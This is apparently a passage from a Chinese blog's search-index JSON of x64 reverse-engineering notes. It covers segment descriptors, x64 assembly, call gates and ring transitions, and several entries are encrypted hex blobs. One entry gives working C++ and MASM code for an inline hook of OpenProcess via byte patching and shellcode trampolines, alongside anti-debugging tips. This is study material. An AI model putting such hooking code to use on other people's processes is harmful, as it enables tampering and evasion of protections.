表示允许从低特权级的 程序转移到该段执行。 R 位指示代码段是否允许 读出。代码段总是可以执行的，但是，为了防止程序被破坏，它是不能写入的。至于是否有读出的可 能，由 R 位指定。R＝0 表示不能读出，如果企图去读一个 R＝0 的代码段，会引发处理器异常中断； 如果 R＝1，则代码段是可以读出的，即可以把这个段的内容当成 ROM 一样使用。 码段是不可读的，那处理器怎么从里面取指令执行呢？事实上，这里的 R 属性并非用来限制处理器，而是用来限制程序和指令的行为。一个典型的例子是使用段超越前缀 “CS:”来访问代码段中的内容","link":"/2021/04/18/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/2.%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6/"},{"title":"x64（学习笔记） - 1(汇编)","text":"要点 在x64中对32位的寄存器（比如eax,ebx）操作的时候（xor and mov 等）会影响64位的寄存器 。在x64中 mov eax,0x1 和 mov rax,0x1 俩个汇编的相等的 —零拓展 x64寻址和x32寻址不一样 call offset =call goto address - rip x64中 没有pushad pushaq 有 pushfq（eflags）; push cs, push ds 也没有了 vs x64项目使用汇编配置： 右键项目 -&gt; 生成依赖项 -&gt; 生成自定义 -&gt; 选中masm -&gt; 确定 右键.asm 属性 -&gt; 项类型选择 Microsoft Macro Assembler .asm文件 “;”在.asm 中 是注释 在asm中 16进制不能使用0x12345678 需要使用 12345678h 注意函数名和汇编指令冲突 函数名要加上extern_c 用c的规则来生成函数 12345678.code ; 在代码段MySub proto; 导入代码中的函数funcName proc; funcName 函数名 mov rax,rcx add rax,rdx retfuncName endp;函数结束end; 其他C++默认导出函数 会有返回值和参数的后缀","link":"/2021/07/10/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1(%E6%B1%87%E7%BC%96)/"},{"title":"x64（学习笔记） - 10(异常1)","text":"嗨，请准确无误地输入密码查看哟！ 289f71be50683e8477adef2014d66fe922e80b0f537543098ab1d2ac817bd030ff0f44a33e55a94a4d9444bbec69dfc3fe5c0b12fcacfcefd782b31c75be1b7c651dae9f000c949ff841a14007d223337fdd53babf3688d6e86639c4940cecf43ee3f45422b6c0c36cb285b26b741a50842d285f3147cf36ab1de8ccfab819cea067445723a0c8b9e2c064140a0181313e4bdb2f34ff69b7cf179460b097aa6c16726d6d6d3550cc5c14e58895f09371e3b2dd4e58739fec59b52b4d02b81805809dac285e32474abccfc01bdf75d8d981e1fdce89bada0536048efe6ccc911c92435ca3e359456d6336ad4e9ac938ad99cf0b88f3c26b97a85c44e4a0b62179703d08b77f46eaf2d5391895383624e5f2b98ba5fe0201bd32998d6bf11eb1eb3c21b3d781bccf29dd5b2ddb667602c544f6c9e0c946b0441a858d94413aeca3f5e7110c0b78a9220c6db01d6ac5e12b32648821ebf74ee4fdb669f5317e31742bb54de77bebd46b1a195e6121a30d1a180125ff5296f95b2eec9f300e28cb17186319aa9e56df9d407d1d4c791fc8ee00b2a16b6ad654293062eacd78213235610e718c87ea31b149875e3686d6a8eda057c9d0cc48c8fed3765e0e1b111e781b598964ada0ae794f2ca08fcc78d0c25b0fc3c89c52537c19fdf08adb523f0ba33e90803f7e66ec05c6090f0ceafcbb8a78c11f6811ef467921c73daf35b55f1fb9d3fce2c0a96684b51b04b6fa3b0238389c662e97a47d3eef5d7ccd7f71266dbd7a73d4183eef2130c6af270b84ff6b553350e1a8d9c52ed2df68790bb8b37f50d4070bb9f58683307438ff2bdfbf181344fa230d7f7691f0ddad86b7c6df56efe67664887322a5163b4d005461652816cf5159ee5d9bd50d2fb680dc87c72ae23f79003e7b4a542ec6cc5d95af2bafdf1883dd577d0eb4933f62452e3a174421f362245f19ea388e5ec8e7a3f413b22cbc69c6b1dd33c54a427dd9b43be51f1f39bd3ef378bf15c61b1201c52ade78ab6353d80bd54f8863db9ceaaf38098f1e936c9d38099ab35838f09aa1a5fc12578ed48f6521572d08a9fe9c87ba5c129ec5ec888d56564d28860fe99afae456cf9b102a59ac2de21fce89d19e0262a0f3502c8c435e53c79d245f6da52312","link":"/2020/08/27/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-10(%E5%BC%82%E5%B8%B81)/"},{"title":"x64（学习笔记） - 10(异常2)","text":"嗨，请准确无误地输入密码查看哟！ 62112dfd54028f379e10a0319ea6555055d8ffa54e80d5848f0b11971e3b1e6cccb52302b69f4a8a7657bd652ae2f2a3778fe18ef5d00c500159c761a80abdc7ca4bbbe12bbce4cf25e141ab95d06165238ad8a4bd3e78ea9e5f37eee118a28165e63d2b3a2a8ec06fbb30b9d40c567ec7d673bb331f840a0edf6f51cd6863b0d8682db16d2f9f04b9600ca0e3dbf3b3119570c89cedcd8255448f70ce001295673279cf0cedf800fb8dceba42d367bd17b86cd3aac67450de9abcaf27954becd03d536dca60851b213ebcfea99cc0964a8f23847cccfbcce1e1b72a101b4e218883dcf0bccd8a53c71da74c2ad844e68257bbe5b3d3bdf3fcadd3f620d20012c7d5a608e774fe34ff21b7e158ff4c8c0b21c406ab2ea66191feff2642b59f9f81b10ef8df87856ab69e4fedf0469fd0dbef85276d27bff485e73d8127d8ac84f2c6f797e9c3fe9a7d5bfc995ea37eaab0ad383c49e975762966208dee21c6c6617e6fa8dac0a80d2a9aa728f2abe8219becbd23cef8663275d0f25219cedfabbe3cc311f6ecc33c2ab6ddf646cdc35de3471597e8a0c66976ff9beca84b304c7f988357aec84b6584fc9231f2cfde12d8ef3d3ac568b2dfd28db888f4fd67985dc1639036d440d3f759af866d560de8c60267a933496da5395575fc0daed3b0d384bd2c3fa055e3a21db17ea0c8b9ab1f8c190a28e107130712bc8444b44356433018805fe185b74333367ea66f95ff0ea425227391a8c62dde5a0d76cf563c","link":"/2020/08/27/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-10(%E5%BC%82%E5%B8%B82)/"},{"title":"x64（学习笔记） - 10(异常2)","text":"嗨，请准确无误地输入密码查看哟！ 40f6ac0bb6a9833e879b3d8a01d5930054fdabb808c585db3dfa6ac57580680251eb09fb5209e9efc446a39c06de46a21b2998d1b1e211300a94d44f014b9186b633cf0d0215ba0bc4d167edc36a7625f60740b3d927a6b5a56209296f2868c9e01eb18d7e9d891cc6650e8da9ae6dc81ca6de2c221fb1dd4bfdb47618939c081d30098d8c0510ca22ce40ea73effc20d312d81de69e6bb2919218e0dda768a1ee990bbaf0b4345c6fbc23f1a06d13f8b43dde31c4f8e582e2d69a4186c5c5dbc2a2e47e7ac02bacc936bc1f4d8077e039292fe73b781e8d6d4bf500ee73e2956f135a0d8d9f9f4a15cf3efec870c0ea7f7f2d7e2dad538da460873ab2a0bf35b29e9f18d5bd7a2f7f060b6c4b03068b0f4081a850052f6e1fd5f9fb92464b9f49bfcd0d4599474970f7152d75ca7230f0e636713d25e2712e67f9099ac0c2e65427d7ed89736939636d195b851e096a3f53f1c10f7286d4bb1b1c8a48a967a858832475da4a1f91e8f52786cbaef374720d314690a6eea2eec73bd4c4b4758db7f8f6717ff8ec4d6d0c8a863183f791f23938775f00e912d6462a0a08c9ae83d622dde12d3ceb3954b1c00dc7162ba39d56433a7780c3b1347a654cf1754e889136c09391c8a9396c82c68d32f9bbe183353e04202c616941be95c0d90df31b","link":"/2020/08/27/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-12(%E8%B0%83%E8%AF%95)/"},{"title":"x64（学习笔记） - 1(函数逆向)","text":"要点 在x64默认下不使用rbp寻址，使用rsp寻址 在x64下栈是静态的栈，函数开头会默认开辟好所有的栈 栈帧 - 栈顶 到 栈底的高度 x64中栈帧是静态的，默认就开辟好了 在x64中 修改rsp 可能是 sub 也可能是 lea 在x64中 堆栈回溯 需要计算rsp 来回溯堆栈 在x64中 ret 一般都没有参数 因为栈是静态默认开辟好的 48位有效地址有多少有效内存呢？2^48=40000G 物理地址有效内存 2^40=1024G 物理机的物理线有多少跟 64位下 E9 call 是模块 call 上下2G范围 64位下 跨大地址调用 1234push rax; 1个字节mov rax,0x123456789; 10个字节push rax; 1个字节ret; 1个字节 123push rax; 1个字节mov rax,0x123456789; 10个字节jmp rax; 2个字节 因为会破坏寄存器所以到目标地址后需要pop rax; FF 25(FF 15) 绝对调 jmp + 绝对地址 FF 25 00 00 00 00 XX XX XX XX XX XX XX XX （14个字节) 在头部（尾部）挂hook需要6个字节就够了 注意 在写代码的时候，尽量少直接传递结构体（浪费性能，会多次复制结构） 反调试 回溯堆栈 看看来源 是不是自己模块的函数 伪造调用 调用完挂hook / veh 在修复","link":"/2021/07/10/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2(%E5%87%BD%E6%95%B0%E9%80%86%E5%90%91)/"},{"title":"x64（学习笔记） - 3(x64InlineHook)","text":"inlineHook 过程 选择hook方式 获取hook地址（如果是导入表的函数注意jmp） 计算hook掉的字节（汇编引擎 / 手动计算） 保存要被替换掉的汇编，计算被替换掉字节下一行的地址 构建hook shellcode shellCode替换掉目标地址的代码（为了不破坏原有寄存器，需要保存当前寄存器，火哥推荐的是 构建的shellcode 使用asm push所有寄存器 然后提升栈顶 调用自己的函数 恢复栈顶 然后pop） 构建调用原函数的 shell code， 执行被替换掉的汇编，然后jmp到之前存储的地址 要点 因为原有call都是相对偏移，如果hook call相关的 比较麻烦 不能直接hook 函数的地址 因为可能会有jmp跳转，直接调用的函数的地址 可能不是函数头是jmp需要使用GetModuleHandleA 然后再GetProcAddress 获取到函数地址 注意 在写代码的时候，尽量少直接传递结构体（浪费性能，会多次复制结构） 再使用 xx xx xx xx xx xx xx xx ff 25 f2 ff ff ff 这种构造调整的时候 需要注意 地址会被当成命令来执行 反调试 回溯堆栈 看看来源 是不是自己模块的函数 伪造调用 调用完挂hook / veh 在修复 代码InlineHookEngine.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#include &quot;InlineHookEngine.h&quot;#include &quot;LDasm.h&quot;typedef HANDLE(WINAPI* OpenProcessProc)( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId );EXTERN_C HANDLE Hook( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId);EXTERN_C HANDLE NewOpenProcess( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId){ printf(&quot;-------------------------------------\\r\\n&quot;); return 0;}char* oldCode;uint32_t GetAsmLength(PVOID psrc){ ldasm_data ld = { 0 }; uint32_t len = ldasm(psrc, &amp;ld, is_x64); return len;}UINT GetFuncOffset(PVOID funcAddress,UINT needOffsetNum,UINT currentNum = 0){ PVOID newfuncAddress = (PVOID)((UINT64)funcAddress + currentNum); currentNum += GetAsmLength(newfuncAddress); if (currentNum &gt;= needOffsetNum) { return currentNum; } return GetFuncOffset(funcAddress, needOffsetNum,currentNum);} EXTERN_C int main(){ //1.获取hook位置 HMODULE hModule = GetModuleHandleA(&quot;kernelbase.dll&quot;); PVOID64 funAddress = GetProcAddress(hModule, &quot;OpenProcess&quot;); //2.计算hook掉的字节 UINT offset = GetFuncOffset(funAddress, 6); // LDasm //3.保存要被替换掉的汇编，计算被替换掉字节下一行的地址 oldCode = (char*)malloc(offset); memcpy(oldCode, funAddress, offset); ULONG64 originalFuncLastAddress = (ULONG64)funAddress + offset; //4.构建hook shell code //函数头部的hook 利用函数头部空白的字节来操作 需要判断函数头部空白字节是否有8个0x00 / 0x90 / 0xCC char shellCode[] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF,0x25,0xF2,0xff,0xff,0xff }; *(PULONG64)&amp;shellCode = (ULONG64)Hook; //修改原函数 PVOID64 hookFunAddress = (PVOID64)((ULONG64)funAddress - 8); ULONG oldProtect; if (VirtualProtect(hookFunAddress, USN_PAGE_SIZE, PAGE_EXECUTE_READWRITE, &amp;oldProtect)) { memcpy(hookFunAddress, shellCode, sizeof(shellCode)); VirtualProtect(hookFunAddress, USN_PAGE_SIZE, oldProtect, &amp;oldProtect); } else { return 0; } //5.构建调回去的shell code char CallOrginalFuncShellCode[] = { 0xFF,0x25,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, }; PVOID CallOrginalFunc = VirtualAlloc(NULL, USN_PAGE_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(CallOrginalFunc, oldCode, offset); *(PULONG64)&amp;CallOrginalFuncShellCode[6] = originalFuncLastAddress; memcpy((PVOID)((ULONG64)CallOrginalFunc + offset), CallOrginalFuncShellCode, sizeof(CallOrginalFuncShellCode)); //6.测试调用 HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 10840); printf(&quot;句柄为 %llx\\r\\n&quot;, handle); auto OrginalFunc = (OpenProcessProc)CallOrginalFunc; handle = OrginalFunc(PROCESS_ALL_ACCESS, FALSE, 10840); printf(&quot;句柄为 %llx\\r\\n&quot;, handle); return 0;} hook.asm12345678910111213141516171819202122232425262728293031323334353637383940414243444546.codeNewOpenProcess proto;Hook proc push rax push rbx push rcx push rdx push rbp push rsp push rsi push rdi push r8 push r9 push r10 push r11 push r12 push r13 push r14 push r15 sub rsp,120h call NewOpenProcess add rsp,120h pop r15 pop r14 pop r13 pop r12 pop r11 pop r10 pop r9 pop r8 pop rdi pop rsi pop rsp pop rbp pop rdx pop rcx pop rbx ;pop rax add rsp,8 retHook endpend","link":"/2021/07/10/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3(X64InlineHook)/"},{"title":"x64（学习笔记） - 4（x64保护模式）","text":"x64保护模式 GDT 灰色部分是无效的 设置了也不管用 64位调用门： 段 普通段（代码段/数据段） 8字节 系统段 16字节 要点 默认情况下Cpu是没有开启x64的 问：操作系统如何开始X64答：IA_32_EFER(C0000080)寄存器的设置 MSR 俩款CPU IA64 只有64位环境，不兼容32位环境 IA32 x64与x86指令功能，混合CPU 64位下 R3-&gt;R0 的syscall 默认会把SS改成0 这时候访问东西的时候会无效 它处理好之后才会改成正常的值 gdt中 会有俩个cs 1个给x32用的 1个给x64用的 FS x64系统上 描述的是 x86进程的TEB32 GS x64系统上 描述的是 x64进程的TEB64 x64系统上 R0下 FS没用 GS代表KPCR 注意 64位调用门不支持参数","link":"/2020/08/26/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-4(x64%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F)/"},{"title":"x64（学习笔记） - 5（x64保护模式 - 调用门）","text":"x86程序进x64调用门 123456789101112131415161718192021222324252627282930313233__declspec(naked) void callCate(){ //当进去这个函数时已经处于 64位环境 __asm { __emit 0x0f; __emit 0x01; __emit 0xf8;//swapgs __emit 0x0f; __emit 0x01; __emit 0xf8; //swapgs __emit 0x48; __emit 0xcb; //retfq retfq; }}int main(){ char buf[6] = {0,0,0,0,0x73,0}; //手动构建 gdt __asm { call fword ptr buf; }} x64程序进x64调用门 构建GDT 构建命令 1234567891011121314.codecallCate proc nop call fword ptr [rcx] retcallCate endp;exeCallCate proc swapgs int 3 swapgs retfq; retfq 按照8字节返回 retf按照4字节返回exeCallCate endp;end KTSS64 64位下 GDT中xxxx8bxx`xxxxxxx xxxxxxxx`xxxxxxx 是tss 反调试 从32位下执行64位代码 从64位下执行32位代码","link":"/2020/08/26/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-5(x64%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F-%E8%B0%83%E7%94%A8%E9%97%A8)/"},{"title":"x64（学习笔记） - 6（x64保护模式 - 内存映射）","text":"嗨，请准确无误地输入密码查看哟！ 0afe9fc8d166d58c7a0f08614e18834236e8645514f04529980f51c2022f9c5eed7676681bb0d070f818d12a19382e0a76d27810c31d8f270565ab8e3e4c22b0bb4888ee0837055e2bf9ad2a8571cfa17dd5f45b924ed485deea2f919ddc1866c7f10fcd562de4717a5f447facffe6cb338bc7491ae97fe44d341651ea9841a4f553fa157779ea85772fb0d13cc924fa254c8b11b4e794289c32ee854fcbe6d45121471957f353f8b21d245b11af9bece943f4e45cb0e012e5045c615c58a8284e75f20174ab7fa61467f3c3da4226851ac67098a88b5a04298af1a7c7c7c18afc37830cfedacd884626a8be72a54482efa4a22f37364e1adb6196d4b6a8299305e61f8f864535e13dd1944ba8ddb4f3a959f5eefc21210c51308e99f80bf44e85c9b74585dce663a0c6f052b9402de921213703af887331f1b251153c8fce59140ba37baf377454e1bcd9b9e4f506988a1e758e721baa00068beb8efdefaaa12b630503e151762a66208a7ba2e70e73a72649612f10706d347a96a9d1e054f866bab5dadc685e5ed6ce7b37344b48b6e8ef731b7d5be401319bf8d23bca21afa3809cd8d278a848711935e9f812548a79038c4f47486d8a02f484539dd1a778340707135ab5429a40093457bdf32b6fe577b8a9a6c1500777239cb9c58969510b0943de961adf69b4fc01f0781b63766ef433e900d0e1edabdc0cffc0fb53455b84e136c6e970778403aa4b73cad0affa48a3714b3fce4c62d7c04327b69226f8d6d6b33bbc961ce916df9b13df5d88916f6b2a7a1d036df918155cee730d14e105b2eceff329caa1e23017743fdaae711f42d26065e54f229c1e2ede451d45602080e43c2e6be527d8d950043b004a4546e677fcc28584ee4cba02adf241661a42ce42a53ee8c418262754c117d4bba767b709e0b0591a632a21de8684c525780e3de1d248261dc75f6bde48732e30f8783a641bc7f40e885dd62d4df1f86fb0fb8bc2169e8228f593198edd23da95759f8837d91758d9bde3e99aa625a5c7f06c6a22d57c2d4d8cb10df1b8d05e176c7e9abc77df665307d0418f31f21d835c113b0fadfa047a4a14b36f337328182e9979c34f274336fa9698ae9d5e658dc41e827091a6ef3bbc19f0f40f6a87c72dcb0da8b29c6a704af6c30b3a830df92228d3448d5594ef2c788170832f629d9b71c3a9db867f82f6accd0d098b6bab2053070be5a8c728a48fc3a130ca5b094d9d60104b92ddcd8777802397fb4d0b723c7596c2a8c034b57a3239ec3c1a318bf8e6c9f7884d848bd4db3086f934e5f9df44d87a8bfad4bf26b385be32fe13bc39d05838f4a07aeecf4c63422e6ef7f93fd03a9c91e90e1e71cf862455dd70cab8d9807955b418738fa6b22813c1639a152b0fd6c8cff059b3d4a54be5efa3d93ecf49e03f1a265bc9a8f7a55e000466b7aeb3c1f085c22c7878cab9fbc1e0e6687acdea2d0edff584fc6277aa3a936f529ff36291b2da9620180d6390f34c7e62695db30ebef3ecc36c906d1ef459aa70d861183b368acfacc7d56c08145015e1a9514df897544bb332be03ea0fb4b15860763af909edcfb9b784b2cfd401988e0a7c53fd16d23bfaf0cdc65f89a739270c66922ee55b23d1dd036b0fd9d00a98f50960895c97acbbf1ccf14c5a412fcae17c40d6aba218e7ef543c9e5995a87d440c492d608161aaecc45763c53e8519008600814d78d4221176cf9e7f0d2994b1eef16083dce33a467c8f377c24f2ad6a023632e11e8518fba78e2c14e57e0f6a3e70e02acf146a0acc8e102d38c3623023d2298df29e638ac4fe4db6efbc4339eb0e113d9a4a25101296692821d14d6a6ad8ca345de0057ddeab37f97fba45824eb069f11939fc882526cfb347893c4e6f4298d3c1dd929fc40ca9c75f7e411bf1628125e0b21164ab36e0c620586242ce99b75d3976022f61214c160b957d0eb3b4ca98930a8199fe88d0cf09b0496c3f89c309a1ed0c860bc384a9f94f2a8b07aeaa3c1cf5f7235d6f733b84ccbb2a2a2e584a1a8f9974816bdd25276c322a4c9b16d368ffa20efcca0559d99bf17fae40bba22b9f5ef0fa39d42226dff8e2bf4dd7c61bfe74d910880ae600c53a64135bd9846eb62edaf9a7d2fe30089be81caf52d3b9e283ba86493d69d8bcfd4be6e9bd5dc8236e534e65945bd950ff9108e0a32dbea90df4fffb6433146574d7e90c8cc3fd1e2f40abd7fb43b32521dc0a0423efd0c8e5b7dd044e5e00b158d1aff0f92baf30ca044516f0d94fc7a747fabc257d9103ff91a9090738d199faaa10abab73fe08c5440148bbe8aa2bc9a90581c36f6656107d18f2c84394acf8158e98e0d9426b205f7c53edd94557c2d3116d74e34e5f3a81baef8e2152f855d0ce6aa4864f16271be09fcfdc10133cbc8ab476edaec894f23597cf0798ac3803a1d5c99d9875f10d409d177565e5f640735f54b8a8b753d0cdd19cf46f320b7957e7dcf44ee16db14c936b11819aaf0318690db9b3210f04c0ce0d2d4b527070c9c2745b7da9131a289bb831ff0ca0e3fa6af0feed0e75621f5effa392bef639568d6a5076445937b430fa818a80c9bb62a8b41f5da6815ea9cbf1bf53d2034d93a2bbd4482e74a6e16655c53d82073adf59b61c8936bb7d5e7ca0e158cccf5cf3c7c60f8bb9747faa6281bddc523a9dddad0007a8e7604e0c75ae43d4447dc317720654d1b7ecfa33e7c026276d493dbd4d9c842d0f82eb5eadbbe89e105daad3bfb2d712c998ae54be99146bf1157058700369f86061e2764e7c9b0d0cdf7a6d914ba409b3ed7bc5da83cd49714194c9e0bc06c5b5036c881bd74cf013d2acaea156612d7f196d7bc712c6889269bf0b022f9f7b2df47c1010653a2516cdda00042a8535b05437ffd0e9027f5aec70c1bc352d734f3f1f8acbf04d438f2f0422d9e55885e2e3747e2c5baf69eda86dc659349caf00f40bb07116ec92f80ed3d27e546b2ecfb32d177562c3d2fb840e60100d36e89a8a5e1821a506496cda52cbeb08c61755dda22eb7c7ce3bd65710061e9583039fa37d493f8dc97eb018b3ae4b572aac61b417c040f4e034ed4cbf7e0d9399e0da545230a7cc6957527ae0ec85cdb9616921d0395574d2983bf28791922b95ac5a4f342a9fceb2a6ee817f0e435a68cbdeb6299fee84f27503163a1576e1f08731964b8f6bf098e9f44fcd9908b850e4ae281c69df8a5f66afbe8d8ae4f12bbd3fdb7a45f590382d17d59386a2b61a666b292f2b523e995f3c5cd1492ee0b826a78aa9a28562b21783670622bfc182076cd887b6f18c9a7570250a61264de4561d4005d81f3f1f55f2bc5f16c9c095c39e2a957b45c103d00448680edad09234da0f90e0a26fe9d1549782ed78e9c2b7ce4ecc7690df08f8af5d909dc6295ba72cbc491633e2b9ac2dc904008cedcfbf7046a5b0397937ab0d0967ae3907133a08304b89d9425e2290da0cec033ad205a10c973d82f86c8f7093c000f0421d317e4db42b37d723a7f51efcf34bfb1f54be0b39507b4a578d31106b9f54ba1a5e55413c77b75bc173f42513733d83679ad00c6b3ef4035099ba298f2bb9c4820be44f24038fe11bbf55e25986185bf08b937f29aa67192c072916243a7a982403dc832977edff446a2ab3a5ba4ad6a4be2601c9d253e745d969272c6dce372cd4e1aad3fb63aea987bc1372be1e14e7c359abdeaac949192f0258211be2657f03ca4236fd19956f404f430c7b67853f011afbc196fa3b0b56414acf1983016989ec1812dea8777e059139cec211db0efe7e8336e3960958214525a2a053fc524d5363f65fee696247f2a95cd5582b46cd076e4d30724071974770343221de23ba0e4cdc66de8ffedc1d1610f7cb12284e82e8c228c55ca80b35fef0621f689c50f3d501d9c7f09b1dffe2ad7461041c8374d466b7cee93590f77fa3c40993d49714945ed8b7a77cd862e5ec31eddfd7b565b7bf62379be3fd65c7197bf912302de09985cdb8098b7af80d0dbba98f7585d710f73f61a94eeafac3c5db2ebab561730c1bd09dc2379f5400ad16f230f81259bc7f474fc3eca25685086566282ad47f8bb572d4f4bb1092497cb37c146891987fb2e25eca54d2063bcd3146525c9873733366282cbc762fa937d650e8c92a1d360ca5b9bf99372ee5514a66e7109a7fa6df2af3b45c64f522928cc7a0ee0088574939ea8d39abed55df3b54762b174df2ec9e5608af9602fbc3fe446d83df570ba506bded14fa08f7a159ad81fe95947678661cb7d548172fd479285d2a76b6682bb62352c1cdaad36831bd60d1fb08f617741c03f6b322d9a5a945ec0b842a68104c42b2e3c4b4f77ff1e39591a9edee8448474d9e46f925dd074f04b71dc54b6f3c8188d0ebea40fa901b0e9c593b45aa7962d8753cbcc14e593d27bb7599213e909b09123a4a538463fc4a7235c324118c35820ec9b28d81d4cbb8b6fd6dc7e3229a0cc13e258c50cbfc11d6e24affb99f4e9064bcc34a2c787b8743fcb9315f80d85959a2ef9862910673391ba02f588e161612b55a6bd670df509dac8d25e2f407b760ba00813ecf921d791b4fbb10cfd52418bd7f882caeada2620e2e5fb9a677e20a7cd28d40cf5800e0b545bc42fcde64cd729167c703f7203c53344d7791b8dca5f5e31ed34137f38855a4ad0775474204add5d9aab8d5551d4e0e3c9702cbb9e48f23062ee386f301d48a1e3102810e6956a37443a81633840f5f7c7328f511aaa87460d48995bbbbda000ba5b61f91d9eb089addd73e45b623585e40dec09a38b503a4b173c7370f5da0662be8b2f7fcc6469a0bb15d1a7d484fa546c421b0a6b858d2072397536efe4c8b0f00c7867d3e16e6a6afcb6230e9aaddaea5f797d1e8b4510dfdbdee0f43ada48c5d4bba4d1e44475f8c113d9361f00f7c8061e08a444332204c1f65333bb2952b21a2951ad97e7b02fc729e2a51da8b8d6b1c1dc028ff7a820af5aab8f85580b930f68daf919c92d5fcb8590df2817af28dffb99582f44903119b574bb1289c35623c1d83465abfd5b8c0f5cfc19c6d0c7f5929c14e54f9c4b93b998de6bf4393fc98ef0a52fa32ab292a8a7aeeff32e72f3b1fd11852f994acff1396e044ae2cf72788febc85e1bd6a40e64e7a2fdbefa35a09d43a017b514568a1040e2e64fc883814489e60db169480ba57a89ae1c9bb840de17456fa836cba04dbb69cc8a9534b62fa004e79a01111da5d2ea1a4572ab0c067d2770af605b17d98343fde933ed3402c0695beb2532b445296b73f661c2cd7c1afd9076b13b3d2d8c5ed151da1ba83a7fbf8ea80d5d48aa3f501d212c59fcdce768344136d9a11058389b5acd95f704ab1645e9ec40410581906c6f2b6ee53b9addc951bac78c98981b4a379cd9ca2e3979728d34a4d69df6fa147c8d0c8dc342cecfdb48a03213454ea7c294d32d4525ed421ea8dc8dca4c67c50f1af8dac5028882e5bac0f615c63ce7a4a4353815da9effa6b3dd465b4cedcf2d67acce98064290f871cdbe2ed62c2650b197969866d150709d73d20eb9fc83c41a7216ce6f38eecf34937e415d3828ac207537773aabd9d58d1898b33f76df955895538fc41","link":"/2020/08/26/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-6(x64%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F-%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84)/"},{"title":"x64（学习笔记） - 7（x64 - 漏洞隐藏注入）","text":"嗨，请准确无误地输入密码查看哟！ a015281182418cda67d19eecbbb4c0a5","link":"/2020/08/27/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-7(x64-%E6%BC%8F%E6%B4%9E%E9%9A%90%E8%97%8F%E6%B3%A8%E5%85%A5)/"},{"title":"x64（学习笔记） - 8（x64 - r3进入r0）","text":"嗨，请准确无误地输入密码查看哟！ c437ed21faa00697120ece7df058da38070955587d20dd53384958e7cd93b7e718cd3e008fcea7da8c6a8b8d55c41c820a49da92c12da0169c32d43e674b6e0f7975e05d5c1c28c9133aabb4dbf9903043385a807fd7639b158a2df7003d3c208988abb7e3693599ec46669f37d61309ccfc832a0d399ffd59712ce0e3ad51fce329ea8424bf404cc5a61273ca5348c6d434b33e6f21e501e2c80c63a06c7cf15d8144861276513ed08f2810db830ceced86c73cb3907c776b45c119d877ffa28d6a2957efca12c86e09be317b1de366bde8ffabb4a18ddf1c0d09e54a3380c64ba60b12a8788e8dcbc305801098cf6b45c990512746bd9da979716c309d97223a03b7f605bd8688253ca8f80351d5770d7dc9dda52328f1941fe145f24f167a1c3108bd43af92858a9728351bd9c2efe9a487ff7831f83a23d7642447c6dc0618806c133dbaa697b923ca8c8a632efea5e36bb6f5c47b6b9e6cf0e24e4f3ceabc4bb0c60b8bd1b9a4760454b456f5c1987de475cc4db015d73097093cbdf5d57f1dbef383308af15af5750711a4818e3beec5ca384a1feb22705abd3b198ad703e1b861f7b2b5143c0af7467afe9aae55452947c4b2de616183d80d9a841134413dedabab8f966538c5c16495a6a962bb7dbf0e9201c9cd6eacfb7fd84646154b265bdb2f5269a26741cbdd3134804c1eeb4a89996c840910d6dc710bb3c25572c3308a856d27fd3f3f7a80387ef6e7b436536c71360bdbf3cd451c5c7b0856f91d21c49b1614b099ada67ec2578813b4eda10d6518749443337180cff441e431291c7c1d50cdbfee50c20529de95f5b906a12e9ead58c7d416c6d8d356022fb77654ed3f4f5656ef90362906e3a4a67ec3ca0156286bf13ed6809fc9dd4987148287edbedfa5cb17b70d7a09b0c989b8f0f4afc275d0bf8d46241137c59e7720dfc51440308f2fba28728b74ce2c615fc6a42a8e66090b380f95012518010bb6cb8d0a14c0872f60f4746c0041a775b7d9226f2dac1508b6be7a1f05b60621fb3b2ce59900f9feeccf9580d5833534db0d1f729fdff4a735f1e8e6b3b96527aec483914a55af954c47385100ad8d478cbb15fefe452d5ccb9421cb6bed4018832e5b80b2dc2961e536ff49c1bc30f258e0f6ffd0b17d00bb18261d553eb6aabaa00101565001372dd2e6eab908e39ad5e42d74f7774b2b965e309c7c5016e308f75f9659cc03816bc2e73a59c91606c926b89e696adee2cfc2b33f9f4b86e7f1155dacac8ccd7dc5d3468facba08fc507c